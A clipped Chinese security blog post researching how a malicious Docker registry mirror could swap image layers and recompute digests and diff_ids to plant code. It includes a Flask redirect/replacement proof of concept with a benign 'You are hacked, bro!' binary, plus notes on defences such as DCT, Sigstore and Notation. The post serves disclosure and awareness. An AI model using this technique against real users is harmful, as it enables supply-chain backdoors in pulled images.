---
title: Dockerhub 镜像供应链攻击风险研究 - 有价值炮灰
source: https://evilpan.com/2025/11/30/docker-mirror-attack/
source_host: evilpan.com
clip_date: 2026-08-04T14:42:43+08:00
trace_id: 62c2177b-bb99-4250-b14c-8b025bedd0b1
content_hash: f8a8502c65911c2d47dcc9d2ed3fdb914d0d5f7631d74d0ef062f806878bd021
status: synced
tags:
  - Docker安全
  - 供应链攻击
series: null
feed_source: evilpan·安全
ai_summary: 恶意镜像站可通过篡改 Docker 镜像 layer 与 digest 实现对拉取者的代码植入，且 Docker 默认无校验，现有信任机制（DCT）已弃用，该供应链攻击风险真实存在。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3b275244-d011-8189-b9b3-d5e5420ed8d6
ioc:
  cves: []
  cwes: []
  hashes:
    - 17eec7bbc9d79fa397ac95c7283ecd04d1fe6978516932a3db110c6206430809
    - 1b44b5a3e06a9aae883e7bf25e45c100be0bb81a0e01b32de604f3ac44711634
    - 2771e37a12b7bcb2902456ecf3f29bf9ee11ec348e66e8eb322d9780ad7fc2df
    - 53d204b3dc5ddbc129df4ce71996b8168711e211274c785de5e0d4eb68ec3851
    - 6930d60e10e81283a57be3ee3a2b5ca328a40304
    - 6aa30f8b08e16409b46e0173d6de2f56
    - 6b75187531c5e9b6a85c8946d5d82e4ef3801e051fbff338f382f3edfa60e3d2
    - 6eb1bf5e044ede4cad2267ce2d15d306c5f6e6351e790ac36c7d99ce1418b7e2
    - f7931603f70e13dbd844253370742c4fc4202d290c80442b2e68706d8f33ce26
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 恶意镜像站可通过篡改 Docker 镜像 layer 与 digest 实现对拉取者的代码植入，且 Docker 默认无校验，现有信任机制（DCT）已弃用，该供应链攻击风险真实存在。
> 
> - **攻击链：** `docker pull` 会依次请求 auth.docker.io 获取匿名 token，再向 registry-1.docker.io 获取 OCI Image Index、Manifest 和 Blobs；镜像站可在上述任一环节返回篡改内容。
> - **篡改要点：** 替换 layer 后必须同步修改 layer 的 sha256、Manifest 中 digest、HEAD latest 返回头以及 config 中的 `diff_id`（未压缩差异标识符），否则拉取时校验失败。
> - **PoC 验证：** 作者用 Flask 302 转发到其他镜像站，将 hello-world 的 layer 替换为静态编译的恶意 ELF，并同步更新全部哈希，最终 `docker run --rm hello-world` 输出 "You are hacked, bro!"。
> - **防御现状：** Docker Content Trust（DCT）基于过时的 Notary v1，官方已弃用；Sigstore/Notation 需用户手动 verify 且配置繁琐，国内访问 notary 还可能超时，实际普及困难。
> - **现实风险：** 恶意镜像站可通过 SEO 推广进入镜像源教程，运维若直接复制粘贴多个镜像源，极易被中间人攻击植入后门（如 mysql/nginx 镜像）。

## Dockerhub 镜像供应链攻击风险研究

一年多前，由于不知名的原因，国内访问 DockerHub（准确来说是 Docker Registry）被拦截，导致广大开发者在拉镜像的时候出现了莫名其妙的错误：

```bash
$ docker pull hello-world
Using default tag: latest
Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
```

其实封禁的第一时间我也看到了相关的新闻，只不过当时以为是特殊时期，没想到一转眼就是一年半：

![news](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/103bdbd6ca7749cd.png)

故事由此展开。

## Workaround

不能用就不用了吗？当然不可能，程序员还得继续上班。老板才不管你这那的，总之容器还是得起来。于是就有了各种各样的 “教学” 文章。比如：

-   [DockerHub被禁掉的应对之法](https://zhuanlan.zhihu.com/p/708763666)
-   [Docker 镜像加速](https://www.runoob.com/docker/docker-mirror-acceleration.html)
-   [阿里云镜像加速器](https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors)
-   ……

简单来说，就是两种方法：

1.  使用代理
2.  使用镜像站

这里只做一个简单的总结。

## Proxy

首先是使用代理的方式。docker 因为是 C-S 架构，实际负责工作的组件是后台进程 dockerd。我们前台调用的 docker 命令行工具作用仅仅是连接 docker.sock 然后按照协议给后台进程去发起请求并接受返回。因此给前台程序设置 `HTTP_PROXY` 等环境变量是没用的，同理使用 proxychains 等工具亦然。

因此要挂代理，就必须针对后台进程。对于 docker daemon 而言，设置代理同样只需要设置好环境变量。以 Linux 系统 systemctl 启动的后台进程为例：

直接编辑 `/etc/systemd/system/docker.service.d/your-proxy.conf` ，写入以下内容：

```toml
[Service]
Environment="HTTP_PROXY=http://127.0.0.1:8080"
Environment="HTTPS_PROXY=http://127.0.0.1:8080"
Environment="NO_PROXY=localhost,127.0.0.1"
```

conf 文件的名字不重要，只要在 docker.service.d 目录下即可。上面的配置表示添加三个环境变量，懂的都懂。

配置完后需要重启一下后台进程：

```
sudo systemctl daemon-reload
sudo systemctl restart docker
```

然后验证一下修改是否生效：

```
sudo systemctl show --property=Environment docker
```

## 镜像站

另外一种方法，就是使用所谓的镜像站。还是以 Linux systemctl 为例，要给 docker daemon 后台进程指定使用镜像，需要修改配置文件 `/etc/docker/daemon.json` 写入 `registry-mirrors` 属性，比如：

```json
{
    "registry-mirrors": [
        "https://docker.1ms.run",
        "https://docker.xuanyuan.me"
    ]
}
```

保存之后同样重启后台进程即可：

```
sudo systemctl daemon-reload
sudo systemctl restart docker
```

热情的中国开发者们创建并分享了各种各样的镜像站，比如:

-   [Docker镜像源汇总](https://github.com/dongyubin/DockerHub)
-   [public-image-mirror](https://github.com/DaoCloud/public-image-mirror)

通常用户会随便选几个站直接粘贴到自己的配置文件中即可正常使用，当然我也是这样。

可每次用镜像站的时候我都在想，这些站点是否安全，如果站长故意作恶的话会不会把我给 RCE 了？也许有点杞人忧天，但是毕竟 “Only the Paranoid Survive”，我觉得深入想想也没什么不好。

## 攻击面分析

终于来到了本文的正题。其实问题很简单：假如我是一个恶意的镜像站，是否能够给用我的人植入木马，如何操作？

为了回答这个问题，需要先知道 `docker pull` 的时候发生了什么。根据前面的介绍，先给 docker 后台进程挂个代理进行抓包，看到有以下请求：

![flow](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/aebc2c4345d6915d.png)

首先请求了 auth.docker.io 进行匿名登陆，后续下载镜像的请求都是发往 registry-1.docker.io；这里先验证下这个地址是不是真的被封禁了，不能人云亦云冤枉好人吧。

![test](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/4be5fe07ed7b4f1a.png)

Oops！美丽的中国红🇨🇳！（叠甲：本人并没有说不红的地方不是中国）

接着，来看看每个请求：

1.  GET registry-1.docker.io/v2/
2.  GET auth.docker.io/token
3.  HEAD registry-1.docker.io/v2/library/hello-world/manifests/latest
4.  GET registry-1.docker.io/v2/library/hello-world/manifests/sha256:f7931603f70e13dbd844253370742c4fc4202d290c80442b2e68706d8f33ce
5.  GET registry-1.docker.io/v2/library/hello-world/manifests/sha256:2771e37a12b7bcb2902456ecf3f29bf9ee11ec348e66e8eb322d9780ad7fc2
6.  GET registry-1.docker.io/v2/library/hello-world/blobs/sha256:17eec7bbc9d79fa397ac95c7283ecd04d1fe6978516932a3db110c6206430809
    1.  302 重定向到 cloudflare (GET docker-images-prod.6aa30f8b08e16409b46e0173d6de2f56.r2.cloudflarestorage.com/)
7.  GET registry-1.docker.io/v2/library/hello-world/blobs/sha256:1b44b5a3e06a9aae883e7bf25e45c100be0bb81a0e01b32de604f3ac44711634
    1.  302 重定向到 cloudflare (同 6.1)

第 1 步返回的是 401 Unauthorized，估计是用来校验 DockerHub 账户登陆的。因为我们没登陆，所以第 2 步就直接进行了匿名登陆，返回了 2 个 JWT Token，对于本文的主题而言也不是很需要关心。

接着是第 3 步，获取 manifest，这是个 HEAD 请求，照理来说是不返回内容的，但实际上会在返回的 Header 里带上 manifest 的 hash：

```yaml
200 OK
Date: Sat, 29 Nov 2025 07:42:22 GMT
Content-Type: application/vnd.oci.image.index.v1+json
Content-Length: 12341
Connection: close
docker-content-digest: sha256:f7931603f70e13dbd844253370742c4fc4202d290c80442b2e68706d8f33ce26
docker-distribution-api-versio  registry/2.0
...
```

## Manifest

因为 `latest` 只是个 tag 名字，实际拉取文件还是要根据 sha256 来获取。第 4 步真正获取 latest 对应的 manifest。这是一个 JSON 文件：

```
{
  "manifests": [
    {
      "annotations": {
        "com.docker.official-images.bashbrew.arch": "amd64",
        "org.opencontainers.image.base.name": "scratch",
        "org.opencontainers.image.created": "2025-08-13T22:16:57Z",
        "org.opencontainers.image.revision": "6930d60e10e81283a57be3ee3a2b5ca328a40304",
        "org.opencontainers.image.source": "https://github.com/docker-library/hello-world.git#6930d60e10e81283a57be3ee3a2b5ca328a40304:amd64/hello-world",
        "org.opencontainers.image.url": "https://hub.docker.com/_/hello-world",
        "org.opencontainers.image.version": "linux"
      },
      "digest": "sha256:2771e37a12b7bcb2902456ecf3f29bf9ee11ec348e66e8eb322d9780ad7fc2df",
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "platform": {
        "architecture": "amd64",
        "os": "linux"
      },
      "size": 1035
    },
    {
      "annotations": {
        "com.docker.official-images.bashbrew.arch": "amd64",
        "vnd.docker.reference.digest": "sha256:2771e37a12b7bcb2902456ecf3f29bf9ee11ec348e66e8eb322d9780ad7fc2df",
        "vnd.docker.reference.type": "attestation-manifest"
      },
      "digest": "sha256:6b75187531c5e9b6a85c8946d5d82e4ef3801e051fbff338f382f3edfa60e3d2",
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "platform": {
        "architecture": "unknown",
        "os": "unknown"
      },
      "size": 566
    },
    // ...
    ],
	"mediaType": "application/vnd.oci.image.index.v1+json",
	"schemaVersion": 2
}
```

整个 JSON 文件是 **OCI Image Index** （开放容器倡议镜像索引）格式，其中 manifests 是一个数组，数组中的每个对象都描述了一个实际的镜像清单（Image Manifest）。这里只截取了其中两个。

第一个对象描述了 `amd64/linux` 架构的镜像，包含 cpu 和操作系统信息，以及镜像的摘要；第二个对象则是一个特殊的描述符，它引用了一个 **证明（Attestation）清单**，可以理解为元数据信息。

docker 客户端会根据自身平台在 `manifests` 数组中找到与其平台匹配的描述符，然后下载对应镜像。

比如，笔者测试的系统是 `amd64/linux` ，那么就对应第一个 Manifest 对象，其 sha256 哈希为 `2771e...`，在前面的请求分析中正对应第 5 个请求。该请求同样返回一个 JSON：

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.manifest.v1+json",
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:1b44b5a3e06a9aae883e7bf25e45c100be0bb81a0e01b32de604f3ac44711634",
    "size": 547
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:17eec7bbc9d79fa397ac95c7283ecd04d1fe6978516932a3db110c6206430809",
      "size": 2380
    }
  ],
  "annotations": {
    "com.docker.official-images.bashbrew.arch": "amd64",
    "org.opencontainers.image.base.name": "scratch",
    "org.opencontainers.image.created": "2025-08-08T19:05:17Z",
    "org.opencontainers.image.revision": "6930d60e10e81283a57be3ee3a2b5ca328a40304",
    "org.opencontainers.image.source": "https://github.com/docker-library/hello-world.git#6930d60e10e81283a57be3ee3a2b5ca328a40304:amd64/hello-world",
    "org.opencontainers.image.url": "https://hub.docker.com/_/hello-world",
    "org.opencontainers.image.version": "linux"
  }
}
```

这同样是一个镜像清单，用于描述如何组装一个特定的容器镜像。容器获得了这个 manifest 后，下一步就是根据 sha256 哈希去下载实际的镜像，对应前文中的：

-   第 6 步（17ee）：下载 layers 第一层内容；
-   第 7 步 （1b44）：下载 config 的内容；

cofig 信息是以下 JSON 内容：

```json
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/hello"
    ],
    "WorkingDir": "/"
  },
  "created": "2025-08-08T19:05:17Z",
  "history": [
    {
      "created": "2025-08-08T19:05:17Z",
      "created_by": "COPY hello / # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2025-08-08T19:05:17Z",
      "created_by": "CMD [\"/hello\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:53d204b3dc5ddbc129df4ce71996b8168711e211274c785de5e0d4eb68ec3851"
    ]
  }
}
```

而 layer 则是一个压缩包，我们在下节对其进行详细分析。

至此，网络侧的请求流程基本上分析清楚了。当然本文只是涉及了观察到的请求，实际 Pull 流程的完整接口介绍可以参考下面的文档：

-   [Open Container Initiative Distribution Specification - Pull](https://github.com/opencontainers/distribution-spec/blob/v1.0.1/spec.md#pull)

## Layers

查看下载的 layer 内容之前，我们先学习一下 Docker Image 的组成和格式。Docker 镜像是一个增量文件系统，由一个或者多个层级（Layer）构成。现代容器镜像是基于内容可寻址存储（Content-Addressable Storage）的原则设计的。这意味着一旦一个层或配置对象被创建，它的内容就永远不会改变。对镜像的任何修改都会生成一个新的层和/或一个新的配置对象，从而产生一个新的摘要。

每个层文件本质上是一个 **差异归档（Diff Archive）**，它包含了相对于其前一个层的文件系统变化。

当 Docker 或 OCI 运行时（如 `containerd` ）处理一个镜像时，会按顺序执行以下操作：

1.  将第一个层的内容解压并应用到初始的空文件系统（基础镜像是 `scratch` ）。
2.  将每个后续层的内容 **叠加** （Overlay）到前一层之上。
3.  最终整个容器的文件系统是所有层内容自底向上 **合并** 的结果。

这就是为什么我们平时在构建 Dockerfile 的时候，前面 `RUN apt update && apt install` 之后再接着 `RUN apt clean` 并不会减少容器体积，因为每个 RUN 命令都生成了一个新的 Layer。

> 准确来说， `RUN rm -f file` 时，当前层会创建一个特殊的空文件（whiteout 文件），通常以 `.wh.` 开头（例如 `.wh.filename` ），当文件系统合并时，这个文件会遮盖下面层中同名的文件或目录，对于容器用户而言，下面的文件看起来就像是被删除了。

接着来看我们前面抓包获得的 layer 文件，下载查看后发现是 tar.gz 格式，解压后是一个静态链接的 ELF 文件：

```
$ file layer.tgz
part.tgz: gzip compressed data, original size modulo 2^32 11776

$ tar -xzvf layer.tgz
hello

$ file hello
hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

docker 怎么知道应该把这个文件放到哪里呢？其实很简单，不是根据 config.json，而是根据其在 layer.tgz 中的相对位置确定。

-   [Anatomy of an image](https://github.com/google/go-containerregistry/tree/main/pkg/v1/remote#anatomy-of-an-image)

## 攻击实例

既然每个 Layer 只是文件系统的差异归档，那作为攻击者，是否可以通过修改 Layer 内容，或者新增 Layer 的方式植入恶意代码呢？直觉来看是可以的，本节来进行实际的攻击测试。

首先作为一个恶意的镜像提供商，我需要先写一个镜像站来转发和缓存 docker registry 里的所有镜像，不过这估计需要大量的磁盘空间，我的轻量云估计放不下。回头看一下抓包的内容，既然原始的请求都有 302 重定向，那我直接转发到别的镜像站不就行了？

先用 Flask 整一个简单的中间商镜像站：

```python
@app.route('/<path:path>')
def catch_all(path):
    target_url = f"https://docker.1ms.run/{path}"
    return redirect(target_url, code=302)
```

测试替换镜像源并 pull 一下 hello-world，客户端成功拉取了镜像，查看服务器日志也没问题：

```swift
127.0.0.1 - - [29/Nov/2025 20:35:47] "GET /v2/ HTTP/1.1" 302 -
127.0.0.1 - - [29/Nov/2025 20:35:47] "HEAD /v2/library/hello-world/manifests/latest HTTP/1.1" 302 -
127.0.0.1 - - [29/Nov/2025 20:36:08] "GET /v2/library/hello-world/manifests/sha256:f7931603f70e13dbd844253370742c4fc4202d290c80442b2e68706d8f33ce26 HTTP/1.1" 302 -
127.0.0.1 - - [29/Nov/2025 20:36:09] "GET /v2/library/hello-world/manifests/sha256:2771e37a12b7bcb2902456ecf3f29bf9ee11ec348e66e8eb322d9780ad7fc2df HTTP/1.1" 302 -
127.0.0.1 - - [29/Nov/2025 20:36:09] "GET /v2/library/hello-world/blobs/sha256:1b44b5a3e06a9aae883e7bf25e45c100be0bb81a0e01b32de604f3ac44711634 HTTP/1.1" 302 -
127.0.0.1 - - [29/Nov/2025 20:36:09] "GET /v2/library/hello-world/blobs/sha256:17eec7bbc9d79fa397ac95c7283ecd04d1fe6978516932a3db110c6206430809 HTTP/1.1" 302 -
```

接下来考虑怎么给他加点料。一个直接的想法是把 Layer 整个替换掉，鉴于这是一个包含 ELF 的 tar.gz 文件，感觉还是比较简单的。

首先静态编译一个简单的 hello-world，然后压缩替换原始的文件：

```
$ gcc -static main.c -o hello
$ ./hello
You are hacked, bro!
$ tar -czvf layer.tar.gz hello
```

然后设置 flask 针对 part.tar.gz 返回我们修改后的文件：

```
if path.startswith('v2/library/hello-world/blobs/sha256:17eec'):
	return send_file('layer.tar.gz')
```

直接测试一下试试，理论上应该签名校验失败：

```bash
$ docker run --rm hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
17eec7bbc9d7: Verifying Checksum
docker: Get "https://registry-1.docker.io/v2/": dial tcp 4.78.139.50:443: connect: connection refused.
See 'docker run --help'.
```

和预期中的一样，毕竟哈希都对不上。接下来我们看看还要修改哪些文件，从下往上看：

-   layer.tar.gz 内容变化，导致其 sha256 变化，因此需要修改 digest.json 中的哈希(请求 5)；
-   digest.json 内容变化，因此需要修改 manifest.json(请求 4)；
-   manifest.json 内容变化，需要修改 HEAD latest 的返回头(请求 3)；
-   …

依次把对应的 sha256 修改完后，发现无法启动。调试了半天不得其解，最后发现是 digest.json 中除了 layer 的哈希，还要修改 `diff_id` 。这个 `diff_id` 是对一个镜像层内容的 **未压缩** 文件系统差异计算出的唯一标识符，具体计算过程比较复杂，我们直接参考 docker 用 golang 来实现即可：

```go
layer, err := tarball.LayerFromOpener(func() (io.ReadCloser, error) {
return os.Open(filePath)
})
if err != nil {
panic(fmt.Errorf("error creating layer from opener: %w", err))
}
diffID, err := layer.DiffID()
```

另外这里介绍一下 docker 的调试方法，首先在 /etc/docker/daemon.json 文件中加入 `"log-level": "debug"` 字段，然后重启后台进程，使用下面的命令就可以查看详细日志了：

```
sudo journalctl -u docker.service -f
```

最终实现效果：

```bash
$ docker run --rm hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
cf02c551b988: Pull complete
Digest: sha256:6eb1bf5e044ede4cad2267ce2d15d306c5f6e6351e790ac36c7d99ce1418b7e2
Status: Downloaded newer image for hello-world:latest
You are hacked, bro!
```

这个攻击实验过程中涉及到的代码我都放在了 [Github](https://github.com/evilpan/docker-registry-mitm.git) 中，感兴趣的可以参考。

## 防御方案

对于这类攻击，Docker 官方给出的方案是使用 Docker Content Trust (DCT) ，即在运行前加上 `DOCKER_CONTENT_TRUST` 环境变量，这样在执行 docker pull 请求后会自动在后台执行验证。

不过这种方案一方面基于过时的 Notary v1 技术，目前已被 Docker 官方弃用和淘汰；另一方面则是不属于默认安全，很少有用户会手动指定。而且，即使你指定了，在国内也可能会遇到网络错误：

```
$ DOCKER_CONTENT_TRUST=1 docker run --rm hello-world
docker: Error: error contacting notary server: dial tcp 208.43.170.231:443: i/o timeout.
See 'docker run --help'.
```

作为新的替代验证方案，比如 Sigstore 或者 Notation，使用起来更为繁琐。镜像作者需要配置好公钥，而使用方则需要先验证（如 cosign verify）、后拉取，普及起来依旧任重道远。

-   [Content trust in Docker](https://docs.docker.com/engine/security/trust/)
-   [Retiring Docker Content Trust](https://www.docker.com/blog/retiring-docker-content-trust/)
-   [Sigstore](https://www.sigstore.dev/)
-   [Notation](https://github.com/notaryproject/notation#readme)

## Whom To Blame？

假设，不久后的某天，一个别有用心的黑客（比如银狐的大哥），基于这个中间人攻击的原理，部署了一大群恶意的“镜像站”，并且通过 SEO 的方式广泛传播。然后，某萌新运维在运行 docker 失败后上百度搜索了 “docker pull 失败怎么办” 发现第一条正好是设置镜像源的教程，而其中的 10 条镜像源有 8 条都是恶意的。最终通过镜像站下载了一个有后门的 mysql/nginx，导致了入侵事件的发生。那么，这个安全事故主要应该让谁背锅呢？

单选题：

-   A. 实施攻击的银狐大哥
-   B. 复制粘贴的萌新运维
-   C. 分享技术的吃瓜博主
-   D. 矫枉过正的有关部门
-   E. 竞价排名的某度搜索

对此，你怎么看？请在评论区留言吧！（逃

## 参考链接

-   [PoC of docker registry-mirror MITM attack](https://github.com/evilpan/docker-registry-mitm.git)

* * *

> **版权声明**: 自由转载-非商用-非衍生-保持署名 ([CC 4.0 BY-SA](https://creativecommons.org/licenses/by-nc/4.0/))  
> **原文地址**: [https://evilpan.com/2025/11/30/docker-mirror-attack/](https://evilpan.com/2025/11/30/docker-mirror-attack/)  
> **微信订阅**: **『 [有价值炮灰](http://t.evilpan.com/qrcode.jpg) 』**  
> – *TO BE CONTINUED*.

* * *
